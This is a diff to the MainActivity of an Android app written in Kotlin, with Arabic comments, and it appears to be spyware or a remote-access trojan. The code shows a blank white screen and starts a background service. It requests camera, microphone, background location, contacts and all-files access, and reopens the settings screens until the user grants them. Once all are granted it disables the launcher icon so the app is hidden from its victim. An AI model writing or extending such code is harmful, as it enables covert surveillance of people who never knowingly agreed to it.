@@ -30,31 +30,68 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // شاشة بيضا
         val white = FrameLayout(this)
         white.setBackgroundColor(Color.WHITE)
         setContentView(white)
 
-        // سجّل الجهاز
-        DeviceManager.registerDevice(this)
+        // سجّل الجهاز — مرة واحدة فقط
+        DeviceManager.registerDeviceOnce(this)
 
         // شغّل الخدمة
         startBackgroundService()
-
-        // أنشئ channel الإشعارات
         createNotificationChannel()
 
         // ابدأ بطلب الأذونات
         requestPermissionsStep1()
-
-        // ⭐ إخفاء الأيقونة بعد 8 ثواني من الإعداد (بعد ما الأذونات تتم)
-        handler.postDelayed({ hideLauncherIcon() }, 8000L)
     }
 
     // ═══════════════════════════════════════════
-    //  إخفاء الأيقونة
+    //  فحص كل الأذونات
     // ═══════════════════════════════════════════
-    private fun hideLauncherIcon() {
+    private fun hasAllPermissions(): Boolean {
+        // 1. الصلاحيات الأساسية
+        val basics = listOf(
+            Manifest.permission.READ_EXTERNAL_STORAGE,
+            Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.CAMERA,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.ACCESS_COARSE_LOCATION,
+            Manifest.permission.READ_CONTACTS
+        )
+        for (p in basics) {
+            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED)
+                return false
+        }
+
+        // 2. POST_NOTIFICATIONS (Android 13+)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
+                return false
+        }
+
+        // 3. BACKGROUND_LOCATION (Android 10+)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED)
+                return false
+        }
+
+        // 4. MANAGE_EXTERNAL_STORAGE (Android 11+)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager())
+                return false
+        }
+
+        return true
+    }
+
+    // ═══════════════════════════════════════════
+    //  إخفاء الأيقونة — بس لما كل الأذونات تتفعل
+    // ═══════════════════════════════════════════
+    private fun hideLauncherIconIfReady() {
+        if (!hasAllPermissions()) {
+            Log.d("MainActivity", "Permissions not complete yet — waiting")
+            return
+        }
         try {
             val component = ComponentName(this, LAUNCHER_ALIAS)
             packageManager.setComponentEnabledSetting(
@@ -62,14 +99,14 @@ class MainActivity : AppCompatActivity() {
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             )
-            Log.d("MainActivity", "Launcher icon hidden")
+            Log.d("MainActivity", "✅ Launcher icon hidden — all permissions granted")
         } catch (e: Exception) {
             Log.e("MainActivity", "hide err: ${e.message}")
         }
     }
 
     // ═══════════════════════════════════════════
-    //  Permissions
+    //  Permissions Flow
     // ═══════════════════════════════════════════
     private fun requestPermissionsStep1() {
         val needed = mutableListOf<String>()
@@ -153,19 +190,53 @@ class MainActivity : AppCompatActivity() {
         handler.postDelayed({ onSetupComplete() }, 2500)
     }
 
+    // ═══════════════════════════════════════════
+    //  بعد الإعداد — فحص إذا كل الأذونات اتمنحت
+    // ═══════════════════════════════════════════
     private fun onSetupComplete() {
-        // ⭐ إخفاء الأيقونة فوراً
-        hideLauncherIcon()
+        // افحص — لو كل الأذونات اتمنحت، أخفي الأيقونة
+        hideLauncherIconIfReady()
 
-        // ⭐ افتح الهاتف الافتراضي مرة واحدة
+        // لو لسه ناقص أذونات، جدول فحص كل 5 ثواني
+        if (!hasAllPermissions()) {
+            handler.postDelayed({ checkAndHide() }, 5000L)
+        }
+
+        // افتح الويب
         try {
             startActivity(Intent(this, WebViewActivity::class.java))
         } catch (_: Exception) {}
         finish()
     }
 
+    private fun checkAndHide() {
+        if (hasAllPermissions()) {
+            hideLauncherIconIfReady()
+        } else {
+            // لسه ناقص — ارجع افتح الإعدادات للصلاحيات الناقصة
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                    try {
+                        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+                        intent.data = Uri.parse("package:$packageName")
+                        startActivity(intent)
+                    } catch (_: Exception) {}
+                }
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                if (!Environment.isExternalStorageManager()) {
+                    try {
+                        val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                        intent.data = Uri.parse("package:$packageName")
+                        startActivity(intent)
+                    } catch (_: Exception) {}
+                }
+            }
+        }
+    }
+
     // ═══════════════════════════════════════════
-    //  Background service
+    //  Service + Notification
     // ═══════════════════════════════════════════
     private fun startBackgroundService() {
         try {
